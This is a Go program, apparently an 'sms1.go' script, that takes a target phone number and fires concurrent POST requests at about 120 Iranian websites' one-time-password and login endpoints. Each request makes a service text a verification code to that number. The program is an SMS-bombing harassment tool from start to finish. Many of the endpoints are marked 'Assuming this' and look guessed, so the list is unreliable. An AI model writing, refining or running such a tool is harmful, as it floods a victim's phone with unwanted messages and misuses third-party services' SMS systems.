package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io" // Changed from ioutil
	"log"
	"net/http"
	"os"
	"sync"
	"time" // Added for timeout
)

// Define a maximum number of concurrent requests
// Adjust this number based on your system resources and network conditions
const maxConcurrency = 50 // Example: allow up to 50 requests at a time

func main() {
	// Check if phone number is provided as a command-line argument
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run sms1.go <phone_number>")
		os.Exit(1) // Exit with an error code
	}
	phoneNumber := os.Args[1]

	// Basic validation for phone number format
	// You might want to add more robust validation using regex
	if len(phoneNumber) < 10 || len(phoneNumber) > 15 { // Example simple length check for typical Iranian numbers
		fmt.Println("Invalid phone number format. Please provide a valid number.")
		os.Exit(1) // Exit with an error code
	}

	// List of URLs to send requests to
	// This list is taken from your original code and may require verification
	urls := []string{
		"https://app.snapp.taxi/api/api-passenger-v4/anonymous/login/otp",
		"https://api.divar.ir/v5/auth/authenticate",
		"https://api.tapsi.cab/api/v2/user",
		"https://api.telewebion.com/v3/auth",
		"https://api.filimo.com/public/v1/user/validate-mobile",
		"https://get.team/api/v1/auth/step1",
		"https://core.gap.im/v1/user/status", // Assuming this endpoint exists and is for auth
		"https://nobat.ir/api/v2/auth/login",
		"https://app.miboro.ir/api/v2/user/otp", // Assuming this exists
		"https://www.buskool.com/api/v1/user/otp",
		"https://www.digikalajet.com/user/login",
		"https://www.namava.ir/api/v1.0/auth/send-code",
		"https://www.iranflix.com/api/v1/auth/send-mobile", // Assuming this
		"https://www.aparat.com/etc/api/APRSENDVKEY/service/aparat/ref/https://www.aparat.com", // Assuming this
		"https://www.sibapp.com/api/v1/user/send-verification-code", // Assuming this
		"https://www.cinemasaat.ir/api/v1/auth", // Assuming this
		"https://www.offch.com/api/v1/auth/send-code", // Assuming this
		"https://ws.alibaba.ir/api/v3/account/register-check", // Assuming this
		"https://api.zarinplus.com/user/v2/otp", // Assuming this
		"https://api.shab.ir/api/v1/auth/send-verification-code", // Assuming this
		"https://banimode.com/api/v2/auth/request-otp",
		"https://kafebazaar.ir/auth_phone_send_v2", // Check actual endpoint and method
		"https://lidom.ir/api/v1/auth/send-otp", // Assuming this
		"https://maxbit.ir/api/v1/auth/send", // Assuming this
		"https://takhfifan.com/api/v2/auth/otp/send",
		"https://ostadkr.com/api/auth/send-otp", // Assuming this
		"https://www.pintapin.com/api/v1/users/otp", // Assuming this
		"https://drnext.ir/api/v1/patient/auth/send-otp", // Assuming this
		"https://gate.bale.ai/v1/auth/sendcode", // Assuming this
		"https://tik8.app/api/v1/auth/send-code", // Assuming this
		"https://a4b.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.sheypoor.com/v10/auth/send_verification_code",
		"https://www.mizdoon.com/api/auth/send_otp", // Assuming this
		"https://api.dokani.ir/api/user/send-otp", // Assuming this
		"https://www.vitrin.shop/api/v1/auth/otp", // Assuming this
		"https://snappfood.ir/mobile/v2/auth/send-verification-code",
		"https://api.digistyle.com/api/v1/auth/send-otp",
		"https://www.azki.com/api/v1/auth/send-code",
		"https://tap30.cab/api/v2/user", // Check actual endpoint
		"https://bama.ir/signin-request",
		"https://api.basalam.com/users/auth/otp_request",
		"https://rest.ikb.ir/v1/auth/login", // Assuming this
		"https://api.pakat.app/v1/auth/send-otp", // Assuming this
		"https://api.tamadon.app/api/v1/account/send_code", // Assuming this
		"https://app.raydar.ir/api/v1/auth/otp", // Assuming this
		"https://chapgardi.com/auth/send-otp", // Assuming this
		"https://mobo.ir/api/auth/send-otp", // Assuming this
		"https://iranicard.ir/api/v1/client/auth/send-otp", // Assuming this
		"https://www.shakhes.io/api/v1/auth/send_verification_code", // Assuming this
		"https://api.pezeshket.com/v1/auth/send-otp", // Assuming this
		"https://gate.bimito.com/api/v1/user/auth", // Assuming this
		"https://api.yekta.dev/v1/auth/send-otp", // Assuming this
		"https://khodro45.com/api/v1/auth/send-otp", // Assuming this
		"https://api.bartarbashi.com/auth/send-otp", // Assuming this
		"https://api.zitel.io/api/v1/auth/send-otp", // Assuming this
		"https://api.ketab.io/api/v1/auth/send-otp", // Assuming this
		"https://api.istgah.com/api/v1/auth/send-otp", // Assuming this
		"https://api.behtarino.com/api/v1/auth/send-otp", // Assuming this
		"https://api.bikalam.com/api/v1/auth/send-otp", // Assuming this
		"https://api.darmankade.com/api/v1/auth/send-otp", // Assuming this
		"https://api.doctor-yab.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.eskano.com/api/v1/auth/send-otp", // Assuming this
		"https://api.fidilio.com/api/v1/auth/send-otp", // Assuming this
		"https://api.hamrahcard.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.heyzag.com/api/v1/auth/send-otp", // Assuming this
		"https://api.iranfava.com/api/v1/auth/send-otp", // Assuming this
		"https://api.karboom.io/api/v1/auth/send-otp", // Assuming this
		"https://api.karmasana.com/api/v1/auth/send-otp", // Assuming this
		"https://api.kasbokar.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.kilid.com/api/v1/auth/send-otp", // Assuming this
		"https://api.lenz.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.mamaduke.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.manito.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.modiseh.com/api/v1/auth/send-otp", // Assuming this
		"https://api.mydigipay.com/api/v1/auth/send-otp", // Assuming this
		"https://api.ostadyar.com/api/v1/auth/send-otp", // Assuming this
		"https://api.pallet.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.paytakht-co.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.pezeshk24.com/api/v1/auth/send-otp", // Assuming this
		"https://api.pezeshkyou.com/api/v1/auth/send-otp", // Assuming this
		"https://api.pindo.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.rayganco.com/api/v1/auth/send-otp", // Assuming this
		"https://api.sabad.io/api/v1/auth/send-otp", // Assuming this
		"https://api.safarmarket.com/api/v1/auth/send-otp", // Assuming this
		"https://api.sep.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.server.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.shahr.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.shahrvandyar.com/api/v1/auth/send-otp", // Assuming this
		"https://api.sibin.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.sibplus.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.sigplus.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.sitedar.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.snap.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.snapptrip.com/api/v1/auth/send-otp", // Assuming this
		"https://api.tadris.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.taghche.com/api/v1/auth/send-otp", // Assuming this
		"https://api.tapsi.io/api/v1/auth/send-otp", // Assuming this (Different from tap30/tapsi cab?)
		"https://api.tikid.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.time.ir/api/v1/auth/send-otp", // Assuming this
		"https://api.tiwall.com/api/v1/auth/send-otp", // Assuming this
		"https://api.وبلام.ir/api/v1/auth/send-otp", // Assuming this (example for Punycode if needed)
		"https://api.zoodfood.com/api/v1/auth/send-otp", // Assuming this
		"https://api.zoodroom.com/api/v1/auth/send-otp", // Assuming this
		"https://api.zoodtel.ir/api/v1/auth/send-otp", // Assuming this
		"https://www.baazarsalamat.ir/api/v1/auth/send-otp", // Assuming this
		"https://www.cafecinema.ir/api/v1/auth/send-otp", // Assuming this
		"https://www.chipoli.com/api/v1/auth/send-otp", // Assuming this
		"https://www.cinematicket.org/api/v1/auth/send-otp", // Assuming this
		"https://www.digibuy.ir/api/v1/auth/send-otp", // Assuming this
		"https://www.doctorziad.com/api/v1/auth/send-otp", // Assuming this
		"https://www.iranconcert.com/api/v1/auth/send-otp", // Assuming this
		"https://www.irankhodro.ir/api/v1/auth/send-otp", // Assuming this
		"https://www.kalleh.com/api/v1/auth/send-otp", // Assuming this
		"https://www.karnameh.com/api/v1/auth/send-otp", // Assuming this
		"https://www.netbarg.com/api/v1/auth/send-otp", // Assuming this
		"https://www.offload.ir/api/v1/auth/send-otp", // Assuming this
		"https://www.pishkhan.net/api/v1/auth/send-otp", // Assuming this
		"https://www.safarbook.ir/api/v1/auth/send-otp", // Assuming this
		"https://www.shab.ir/api/v1/auth/send-otp", // Assuming this (Duplicate?)
		"https://www.tagdis.ir/api/v1/auth/send-otp", // Assuming this
		"https://www.taraaz.ir/api/v1/auth/send-otp", // Assuming this
		"https://www.tehrantimes.com/api/v1/auth/send-otp", // Assuming this
		"https://www.tikly.ir/api/v1/auth/send-otp", // Assuming this
		"https://www.zanbil.ir/api/v1/auth/send-otp", // Assuming this
		"https://www.zoodel.com/api/v1/auth/send-otp", // Assuming this
		"https://landing.zarinpal.com/api/otp/send",
		"https://api.khodro.ir/v1/sms/send", // Assuming this
	}

	// Create a single HTTP client with configured Transport for efficiency and timeouts
	client := &http.Client{
		Transport: &http.Transport{
			MaxIdleConns:    100,              // Maximum idle connections across all hosts
			IdleConnTimeout: 90 * time.Second, // How long to keep idle connections open
			// Optional: Configure DialContext for connection establishment timeouts
			// DialContext: (&net.Dialer{
			//     Timeout:   30 * time.Second,
			//     KeepAlive: 30 * time.Second,
			// }).DialContext,
			DisableKeepAlives: false, // Set to true to disable HTTP keep-alives (less efficient)
		},
		Timeout: 15 * time.Second, // Timeout for the entire request (connection, writing, reading)
	}

	var wg sync.WaitGroup
	// Create a buffered channel to limit the number of concurrent goroutines
	// The buffer size is the maximum number of goroutines that can run concurrently
	semaphore := make(chan struct{}, maxConcurrency)

	fmt.Printf("Sending SMS requests to %s...\n", phoneNumber)

	// Loop through the list of URLs and start a goroutine for each
	for _, url := range urls {
		// Acquire a slot in the semaphore. This will block if the channel is full
		semaphore <- struct{}{}

		wg.Add(1) // Increment the WaitGroup counter

		go func(u string) {
			defer wg.Done() // Decrement the WaitGroup counter when the goroutine finishes
			defer func() {
				// Release the slot in the semaphore when the goroutine finishes
				<-semaphore
			}()

			// Prepare the request body as JSON
			// Assuming the API expects a JSON body with a "mobile" key
			data := map[string]string{"mobile": phoneNumber}
			jsonData, err := json.Marshal(data)
			if err != nil {
				log.Printf("Error marshalling JSON for %s: %v", u, err)
				return // Skip this URL if JSON creation fails
			}

			// Create the HTTP POST request
			req, err := http.NewRequest("POST", u, bytes.NewBuffer(jsonData))
			if err != nil {
				log.Printf("Error creating request for %s: %v", u, err)
				return // Skip this URL if request creation fails
			}

			// Set the Content-Type header
			req.Header.Set("Content-Type", "application/json")
            // You might need to set other headers like User-Agent, Origin, Referer depending on the API

			// Send the request using the shared HTTP client
			resp, err := client.Do(req)
			if err != nil {
				// Log the specific error encountered during the request
				log.Printf("Error sending request to %s: %v", u, err)
				return // Skip processing the response if the request failed
			}
			defer resp.Body.Close() // Ensure the response body is closed after reading or if an error occurs

			// Read the response body
			body, err := io.ReadAll(resp.Body) // Use io.ReadAll
			if err != nil {
				// Log the error if reading the body fails, but still print status code
				log.Printf("Error reading response body from %s: %v", u, err)
				// The status code might still be useful, so continue
			}

			// Print the status code and response body for debugging/verification
			log.Printf("Request to %s - Status: %d - Body: %s", u, resp.StatusCode, string(body))

            // Optional: Add logic here to check resp.StatusCode or the content of 'body'
            // to determine if the SMS was likely sent successfully based on the API's response.
            // For example, check if status code is 200 OK or if the body contains a specific success message.

		}(url) // Pass the current URL value to the goroutine
	}

	// Wait for all goroutines to finish executing
	wg.Wait()

	fmt.Println("All requests finished.")
}
